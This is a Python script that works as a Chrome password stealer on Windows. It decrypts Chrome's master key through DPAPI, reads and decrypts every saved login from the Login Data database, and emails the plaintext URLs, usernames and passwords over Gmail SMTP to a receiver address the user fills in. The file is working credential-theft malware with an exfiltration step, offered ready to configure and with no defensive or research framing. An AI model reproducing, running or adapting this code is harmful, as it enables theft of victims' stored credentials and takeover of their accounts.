import os
import json
import base64
import sqlite3
import shutil
import smtplib
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData


EMAIL_SENDER = "YOUR-EMAIL"
EMAIL_PASSWORD = "YOUR GOOGLE APP-PASSWORD"   # it is not the original mail password, search google app password on google
EMAIL_RECEIVER = "YOUR RECIEVING EMAIL"
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587

# Chrome File Paths
LOCAL_STATE_PATH = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                                "Google", "Chrome", "User Data", "Local State")

LOGIN_DATA_PATH = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                               "Google", "Chrome", "User Data", "Default", "Login Data")

def get_master_key():
    """Retrieve and decrypt Chrome's master key from Local State file."""
    try:
        with open(LOCAL_STATE_PATH, "r", encoding="utf-8") as f:
            local_state = json.load(f)

        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        encrypted_key = encrypted_key[5:]  # Remove DPAPI prefix
        master_key = CryptUnprotectData(encrypted_key, None, None, None, 0)[1]  # Decrypt key

        return master_key
    except Exception as e:
        print(f"[ERROR] Failed to retrieve master key: {e}")
        return None

def decrypt_password(encrypted_password, master_key):
    """Decrypt Chrome's AES encrypted password."""
    try:
        if encrypted_password[:3] != b'v10':  # Check if it's the right format
            return "Unsupported encryption format"

        iv = encrypted_password[3:15]  # Extract IV (12 bytes)
        encrypted_data = encrypted_password[15:-16]  # Extract encrypted data
        auth_tag = encrypted_password[-16:]  # Extract authentication tag

        cipher = AES.new(master_key, AES.MODE_GCM, iv)  # Create cipher
        decrypted_password = cipher.decrypt_and_verify(encrypted_data, auth_tag)  # Decrypt

        return decrypted_password.decode("utf-8", errors="ignore").strip()
    except Exception as e:
        return f"Decryption failed: {str(e)}"

def fetch_chrome_passwords():
    """Extract, decrypt, and return saved passwords from Chrome."""
    master_key = get_master_key()
    if not master_key:
        return "Failed to retrieve master key."

    # Make a copy of the database to avoid lock issues
    copied_db = "LoginDataCopy.db"
    shutil.copy2(LOGIN_DATA_PATH, copied_db)

    conn = sqlite3.connect(copied_db)
    cursor = conn.cursor()

    try:
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        password_list = []

        for row in cursor.fetchall():
            url, username, encrypted_password = row
            decrypted_password = decrypt_password(encrypted_password, master_key)

            if username or decrypted_password:
                password_list.append(f"🔹 **URL**: {url}\n👤 **Username**: {username}\n🔑 **Password**: {decrypted_password}\n{'-'*50}")

        return "\n\n".join(password_list) if password_list else "[INFO] No saved passwords found."

    except Exception as e:
        return f"[ERROR] Failed to read database: {e}"

    finally:
        cursor.close()
        conn.close()
        os.remove(copied_db)  # Cleanup

def send_email(password_data):
    """Send extracted passwords via email."""
    try:
        msg = MIMEMultipart()
        msg["From"] = EMAIL_SENDER
        msg["To"] = EMAIL_RECEIVER
        msg["Subject"] = "Passwords Report"

        msg.attach(MIMEText(password_data, "plain"))

        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        server.starttls()  # Secure connection
        server.login(EMAIL_SENDER, EMAIL_PASSWORD)
        server.sendmail(EMAIL_SENDER, EMAIL_RECEIVER, msg.as_string())
        server.quit()

        print("[✅] Email sent successfully!")
    except Exception as e:
        print(f"[ERROR] Failed to send email: {e}")

if __name__ == "__main__":
    extracted_passwords = fetch_chrome_passwords()
    send_email(extracted_passwords)
